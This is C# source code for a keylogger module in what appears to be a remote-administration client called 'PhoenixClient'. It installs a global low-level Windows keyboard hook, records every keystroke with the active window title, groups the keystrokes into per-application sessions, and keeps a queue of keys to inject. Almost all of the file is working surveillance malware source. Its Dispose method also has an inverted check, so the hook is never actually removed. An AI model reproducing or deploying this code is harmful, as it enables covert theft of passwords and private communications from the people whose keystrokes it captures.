using PhoenixLib.Datastore.CommunicationClasses;
using PhoenixLib.Datastore.DataHarvest;
using PhoenixLib.Datastore.KeystrokeClasses;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PhoenixClient.Work.ClientOperations
{
    public static class Keylogger
    {
        public static List<KeyPressed> keystrokeData = new List<KeyPressed>();
        public static Queue<String> keysToPress = new Queue<String>();
        public static void start()
        {
            using (KeystrokeAPI keystroke = new KeystrokeAPI())
            {
                keystroke.CreateKeyboardHook((character) =>
                {
                    keystrokeData.Add(character);
                });
                Application.Run();
            }
        }
        public static void safeAdd(String key)
        {
            lock (keysToPress)
            {
                keysToPress.Enqueue(key);
            }
        }
        public static List<KeystrokeSession> parseSessions(List<KeyPressed> pressed = null)
        {
            if (pressed == null)
            {
                pressed = new List<KeyPressed>(keystrokeData);
            }
            List<KeystrokeSession> sessions = new List<KeystrokeSession>();
            KeystrokeSession current = null;
            while (pressed.Count > 0)
            {
                if ((current == null) || (!pressed[0].CurrentWindow.Equals(current.application)))
                {
                    if (current != null)
                    {
                        if (current.keystrokes.Count != 0)
                        {
                            current.ended = DateTime.FromBinary(current.keystrokes[current.keystrokes.Count - 1].dateTime);
                        }
                        else
                        {
                            current.ended = DateTime.FromBinary(pressed[0].dateTime);
                        }
                        sessions.Add(current);
                        current = new KeystrokeSession
                        {
                            keystrokes = new List<KeyPressed>()
                        };
                    }
                    else
                    {
                        current = new KeystrokeSession
                        {
                            keystrokes = new List<KeyPressed>()
                        };
                    }
                    current.keystrokes.Add(pressed[0]);
                    current.application = pressed[0].CurrentWindow;
                    current.started = DateTime.FromBinary(pressed[0].dateTime);
                    pressed.RemoveAt(0);
                }
                else
                {
                    current.keystrokes.Add(pressed[0]);
                    pressed.RemoveAt(0);
                }
            }
            if (current != null)
            {
                if (current.keystrokes.Count != 0)
                {
                    current.ended = DateTime.FromBinary(current.keystrokes[current.keystrokes.Count - 1].dateTime);
                }
                else
                {
                    current.ended = DateTime.Now; //eep
                }
                sessions.Add(current);
            }
            return sessions;
        }
    }
    public class KeystrokeAPI : IDisposable
    {
        private IntPtr globalKeyboardHookId;
        private IntPtr currentModuleId;
        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL = 14;
        private const int WM_KEYDOWN = 0x100;
        private const int WM_SYSKEYDOWN = 0x104;
        private User32.LowLevelHook callback;

        private Action<KeyPressed> keyPressedCallback;

        public KeystrokeAPI()
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModudle = currentProcess.MainModule;
            this.currentModuleId = User32.GetModuleHandle(currentModudle.ModuleName);
        }

        public void CreateKeyboardHook(Action<KeyPressed> keyPressedCallback)
        {
            this.keyPressedCallback = keyPressedCallback;
            callback = HookKeyboardCallback;
            this.globalKeyboardHookId = User32.SetWindowsHookEx(WH_KEYBOARD_LL, callback, this.currentModuleId, 0);
        }

        private IntPtr HookKeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            int wParamAsInt = wParam.ToInt32();

            if (nCode >= 0 && (wParamAsInt == WM_KEYDOWN || wParamAsInt == WM_SYSKEYDOWN))
            {
                bool shiftPressed = false;
                bool capsLockActive = false;

                var shiftKeyState = User32.GetAsyncKeyState(KeyCode.ShiftKey);
                if (FirstBitIsTurnedOn(shiftKeyState))
                    shiftPressed = true;

                if (User32.GetKeyState(KeyCode.Capital) == 1)
                    capsLockActive = true;

                KeyParser(wParam, lParam, shiftPressed, capsLockActive);
            }

            return User32.CallNextHookEx(globalKeyboardHookId, nCode, wParam, lParam);
        }

        private bool FirstBitIsTurnedOn(short value)
        {
            //0x8000 == 1000 0000 0000 0000			
            return Convert.ToBoolean(value & 0x8000);
        }

        private void KeyParser(IntPtr wParam, IntPtr lParam, bool shiftPressed, bool capsLockPressed)
        {
            var keyValue = (KeyCode)Marshal.ReadInt32(lParam);

            var key = new KeyPressed(keyValue, shiftPressed, capsLockPressed, PInvokeData.CurrentWindowTitle());

            keyPressedCallback.Invoke(key);
        }

        public void Dispose()
        {
            if (globalKeyboardHookId == IntPtr.Zero)
                User32.UnhookWindowsHookEx(globalKeyboardHookId);
        }
    }
}
